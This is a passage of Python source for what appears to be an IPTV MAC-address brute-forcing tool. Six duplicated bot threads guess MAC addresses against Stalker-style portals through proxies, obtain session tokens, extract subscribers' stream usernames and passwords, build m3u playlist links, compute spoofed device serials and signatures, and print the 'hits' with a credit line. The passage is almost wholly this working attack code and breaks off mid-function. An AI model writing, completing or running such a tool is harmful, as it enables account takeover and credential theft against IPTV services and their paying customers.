            res = ses.get(listlink, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
            data = str(res.text)
            break
        except:
            bag = bag + 1
            time.sleep(1)
            if bag == 12:
                break

    if data.count('title":"') > 1:
        for i in data.split('title":"'):
            try:
                kanal = ''
                kanal = str(i.split('"')[0].encode('utf-8').decode('unicode-escape')).replace('\\/', '/')
            except:
                pass

            kategori = kategori + kanal + livel

    list = kategori
    return list


def m3uapi(playerlink, macs, token):
    mt = ''
    bag = 0
    while True:
        try:
            res = ses.get(playerlink, proxies=proxies, headers=(hea2(macs, token)), timeout=7, verify=False)
            data = ''
            data = str(res.text)
            break
        except:
            time.sleep(1)
            bag = bag + 1
            if bag == 6:
                break

    try:
        acon = ''
        if 'active_cons' in data:
            acon = data.split('active_cons":')[1]
            acon = acon.split(',')[0]
            acon = acon.replace('"', '')
            mcon = data.split('max_connections":')[1]
            mcon = mcon.split(',')[0]
            mcon = mcon.replace('"', '')
            status = data.split('status":')[1]
            status = status.split(',')[0]
            status = status.replace('"', '')
            timezone = data.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.replace('\\/', '/')
            realm = data.split('url":')[1]
            realm = realm.split(',')[0]
            realm = realm.replace('"', '')
            port = data.split('port":')[1]
            port = port.split(',')[0]
            port = port.replace('"', '')
            userm = data.split('username":')[1]
            userm = userm.split(',')[0]
            userm = userm.replace('"', '')
            pasm = data.split('password":')[1]
            pasm = pasm.split(',')[0]
            pasm = pasm.replace('"', '')
            bitism = ''
            bitism = data.split('exp_date":')[1]
            bitism = bitism.split(',')[0]
            bitism = bitism.replace('"', '')
            message = data.split('message":"')[1].split(',')[0].replace('"', '')
            if bitism == 'null':
                bitism = 'Unlimited'
            else:
                bitism = datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S')
            mt = '\n╭⫸🆄🆂🅴🆁●🅸🅽🅵\u200d🅞 \n├●ʀᴇᴀʟ➢ ' + str(real) + '\n├●\u200dᴜsᴇʀ➢ ' + userm + '\n├●ᴘᴀss➢ ' + pasm + '\n├─●ᴘᴏʀᴛ➢ ' + port + '\n├──●ᴀᴄᴛᴄᴏɴ➢ ' + acon + '\n├──●ᴍᴀxᴄᴏɴ➢ ' + mcon + '\n├─●ꜱᴛᴀᴛᴜꜱ➢ ' + status + '\n├●ᴇxᴘ➢ ' + bitism + '\n├●ᴛɪᴍᴇᴢᴏɴᴇ➢ ' + timezone + '\n╰─✪ ʜɪᴛꜱ ʙʏ ☛ ' + str(nickn) + ' ☚'
    except:
        pass

    return mt


def d1():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(1, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_01'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(1, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d2():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(2, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_02'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(2, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d3():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(3, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_03'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(3, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d4():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(4, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_04'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(4, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d5():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(5, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_05'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(5, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d6():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(6, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_06'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(6, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
